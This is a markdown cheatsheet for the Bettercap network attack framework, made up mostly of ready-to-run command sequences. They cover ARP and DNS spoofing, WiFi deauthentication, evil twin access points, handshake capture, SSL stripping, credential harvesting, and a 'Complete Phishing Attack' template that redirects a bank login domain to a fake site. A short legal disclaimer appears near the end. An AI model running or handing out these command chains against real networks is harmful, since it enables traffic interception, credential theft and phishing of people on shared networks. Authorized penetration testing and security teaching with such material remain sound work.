# 🦈 Bettercap - Network Attack Framework Cheatsheet

> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Swiss Army Knife for Network Attacks
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

## 📋 Table of Contents

- [What is Bettercap](#-what-is-bettercap)
- [Installation](#-installation)
- [Basic Usage](#-basic-usage)
- [Network Reconnaissance](#-network-reconnaissance)
- [ARP Spoofing (MITM)](#-arp-spoofing-mitm)
- [DNS Spoofing](#-dns-spoofing)
- [WiFi Attacks](#-wifi-attacks)
- [HTTPS Downgrade](#-https-downgrade)
- [Credential Sniffing](#-credential-sniffing)
- [Caplets](#-caplets)
- [Web UI](#-web-ui)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Bettercap

**Bettercap** is the Swiss Army knife for WiFi, Bluetooth, and network reconnaissance. It's the successor to ettercap with modern features:

- 🔍 **Network Recon** - Discover hosts, services
- 🎭 **MITM Attacks** - ARP spoofing, DNS spoofing
- 📶 **WiFi Attacks** - Deauth, evil twin, handshake capture
- 🔓 **Credential Capture** - HTTP, HTTPS (downgrade)
- 📡 **Bluetooth/BLE** - Device discovery, attacks
- 🌐 **Web UI** - Beautiful visual interface

### Features

| Feature | Description |
|---------|-------------|
| **Modular** | Extensible with caplets |
| **Interactive** | Real-time command shell |
| **Scriptable** | Automate with caplet files |
| **Web UI** | Browser-based interface |
| **Go Language** | Fast, modern, cross-platform |

---

## 🚀 Installation

### Kali Linux (Pre-installed)

```bash
# Already installed in Kali
bettercap --help

# Update
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### From Source

```bash
# Install Go first
sudo apt install golang

# Install bettercap
go install github.com/bettercap/bettercap@latest

# Or
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Install UI (Optional)

```bash
# Download Web UI
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

## 💻 Basic Usage

### Start Bettercap

```bash
# Basic start (requires root)
sudo bettercap

# Specify interface
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Non-interactive (run commands)
sudo bettercap -eval "net.probe on; net.show"

# Load caplet file
sudo bettercap -caplet http-ui
```

### Interactive Shell

```bash
# Inside bettercap shell
» help                      # Show all commands
» help net.probe            # Help on specific module
» net.show                  # Show discovered hosts
» set arp.spoof.targets X   # Set variable
» arp.spoof on              # Enable module
» quit                      # Exit
```

### Module Management

```bash
# List all modules
» help

# Get module info
» help arp.spoof

# Enable module
» arp.spoof on

# Disable module
» arp.spoof off

# View module settings
» get arp.spoof.*
```

---

## 🔍 Network Reconnaissance

### Host Discovery

```bash
# Enable network probe
» net.probe on

# Show discovered hosts
» net.show

# Output:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Network Info

```bash
# Show current interface
» net.show

# Interface info
» get net.interface.*

# Gateway info
» get gateway.*
```

### Probe Options

```bash
# Set probe throttle
» set net.probe.throttle 10

# Passive mode (listen only)
» set net.probe.passive true

# Set probe timeout
» set net.probe.timeout 500
```

### Recon Commands

```bash
# Full recon
» net.recon on

# Clear hosts
» net.clear

# Show only active
» set net.show.meta true
» net.show

# Export to file
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

## 🎭 ARP Spoofing (MITM)

### Basic ARP Spoof

```bash
# Start bettercap
sudo bettercap -iface eth0

# Enable probing
» net.probe on

# Wait, then show hosts
» net.show

# Set target (victim)
» set arp.spoof.targets 192.168.1.100

# Enable ARP spoofing
» arp.spoof on

# You are now MITM!
```

### Full Duplex (Both Directions)

```bash
# Spoof both victim and gateway
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Spoof Entire Subnet

```bash
# Target all hosts (except gateway)
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Internal only (don't spoof gateway)
» set arp.spoof.internal true
» arp.spoof on
```

### ARP Spoof + Sniff

```bash
# Complete MITM setup
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

## 🌐 DNS Spoofing

### Basic DNS Spoof

```bash
# Set DNS spoof targets
» set dns.spoof.domains example.com, *.example.com

# Set redirect address (your machine)
» set dns.spoof.address 192.168.1.50

# Enable (requires ARP spoof)
» arp.spoof on
» dns.spoof on
```

### Spoof All Domains

```bash
# Wildcard - redirect everything
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Multiple Domains

```bash
# List of domains
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### DNS Spoof with HTTP Server

```bash
# Complete phishing setup
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Start HTTP server on your machine
» set http.server.path /var/www/phishing
» http.server on
```

---

## 📶 WiFi Attacks

### Enable WiFi Mode

```bash
# Start with WiFi interface
sudo bettercap -iface wlan0

# Enable WiFi recon
» wifi.recon on

# Show discovered APs
» wifi.show
```

### WiFi Reconnaissance

```bash
# Show all APs
» wifi.show

# Output:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Deauthentication Attack

```bash
# Deauth all clients from specific AP
» wifi.deauth AA:BB:CC:DD:EE:FF

# Deauth specific client
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Continuous deauth
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### Handshake Capture

```bash
# Enable WiFi recon
» wifi.recon on

# Set channel (same as target)
» wifi.recon.channel 6

# Capture handshakes
» set wifi.handshakes.file /tmp/handshakes/

# Deauth to force reconnection
» wifi.deauth AA:BB:CC:DD:EE:FF

# Check captured handshakes
» wifi.show.wpa
```

### Evil Twin Attack

```bash
# Clone AP
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Start fake AP
» wifi.ap on

# Now deauth real AP to force clients to connect
» wifi.deauth <real_AP_BSSID>
```

### PMKID Attack

```bash
# Modern clientless attack
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID captured in handshakes folder
» wifi.show.wpa
```

---

## 🔒 HTTPS Downgrade

### SSL Strip (HSTS Bypass)

```bash
# Enable ARP spoof first
» arp.spoof on

# Enable SSL strip
» set https.proxy.sslstrip true
» https.proxy on

# Or use HTTP proxy
» http.proxy on
```

### HTTPS Proxy

```bash
# Setup HTTPS proxy
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# With certificate
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### Capture HTTPS Traffic

```bash
# Full MITM with HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

## 🔓 Credential Sniffing

### HTTP Credentials

```bash
# Enable sniffing
» net.sniff on

# Enable local sniffer
» set net.sniff.local true
» net.sniff on

# Filter HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Credential Harvesting

```bash
# Complete credential capture
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Credentials appear in real-time
```

### Save to File

```bash
# Save captured packets
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Verbose output
» set net.sniff.verbose true
» net.sniff on
```

---

## 📜 Caplets

### What are Caplets?

Caplets are script files (.cap) that automate bettercap commands.

### Built-in Caplets

```bash
# List caplets
» caplets.show

# Common caplets:
- http-ui       # Web interface
- https-ui      # Secure web interface
- local-sniffer # Sniff local traffic
- mitm          # Basic MITM setup
- pita          # WiFi attack automation
```

### Load Caplet

```bash
# From command line
sudo bettercap -caplet http-ui

# Inside bettercap
» caplet http-ui

# From file
sudo bettercap -caplet /path/to/custom.cap
```

### Create Custom Caplet

```bash
# File: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Run custom caplet
sudo bettercap -caplet my-mitm.cap
```

### Update Caplets

```bash
# Update all caplets
» caplets.update
```

---

## 🌐 Web UI

### Start Web UI

```bash
# Install UI first
sudo bettercap -eval "caplets.update; ui.update; quit"

# Start with Web UI (HTTP)
sudo bettercap -caplet http-ui

# Start with HTTPS UI
sudo bettercap -caplet https-ui

# Access: https://127.0.0.1:8080/
# Default credentials: user/pass
```

### Web UI Features

| Feature | Description |
|---------|-------------|
| **Dashboard** | Real-time network view |
| **Hosts** | Discovered devices |
| **WiFi** | Wireless networks |
| **BLE** | Bluetooth devices |
| **Events** | Activity log |
| **Packets** | Captured traffic |

### Configure Web UI

```bash
# Set credentials
» set http.server.username admin
» set http.server.password secretpass

# Set port
» set http.server.port 8080

# Bind address
» set http.server.address 0.0.0.0
```

---

## 📊 Quick Reference

### Essential Commands

| Command | Description |
|---------|-------------|
| `net.probe on` | Start host discovery |
| `net.show` | Show discovered hosts |
| `arp.spoof on` | Enable ARP spoofing |
| `net.sniff on` | Start packet capture |
| `dns.spoof on` | Enable DNS spoofing |
| `wifi.recon on` | Start WiFi scanning |
| `wifi.deauth BSSID` | Deauth attack |
| `https.proxy on` | Enable HTTPS proxy |

### Common Variables

| Variable | Description |
|----------|-------------|
| `arp.spoof.targets` | MITM victims |
| `arp.spoof.fullduplex` | Spoof both directions |
| `dns.spoof.domains` | Domains to spoof |
| `dns.spoof.address` | Redirect IP |
| `net.sniff.output` | PCAP output file |
| `wifi.ap.ssid` | Fake AP name |

### MITM Attack Template

```bash
# Basic MITM
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### WiFi Attack Template

```bash
# WiFi Deauth + Capture
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Complete Phishing Attack

```bash
# DNS Spoof + Fake Site
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

## ⚠️ Legal Disclaimer

```
⚠️ WARNING: Bettercap is a powerful tool that can intercept 
network traffic. Only use on networks you OWN or have 
EXPLICIT WRITTEN PERMISSION to test.

✅ Authorized penetration testing
✅ Security research (lab environment)
✅ Educational purposes

❌ Unauthorized interception is ILLEGAL
❌ Never use on public networks
❌ Never steal credentials
```

---

## 📚 Resources

- [Bettercap Official](https://www.bettercap.org/)
- [Bettercap GitHub](https://github.com/bettercap/bettercap)
- [Bettercap Docs](https://www.bettercap.org/modules/)
- [Caplets](https://github.com/bettercap/caplets)

### Related Cheatsheets
- [Aircrack-ng](../Aircrack-ng/README.md)
- [Wifite](../Wifite/README.md)
- [Wireshark](../Wireshark/README.md)

---

<p align="center">
  <b>🦈 Master Network Attacks!</b><br>
  <i>Bettercap - The Swiss Army knife for network pentesting</i>
</p>
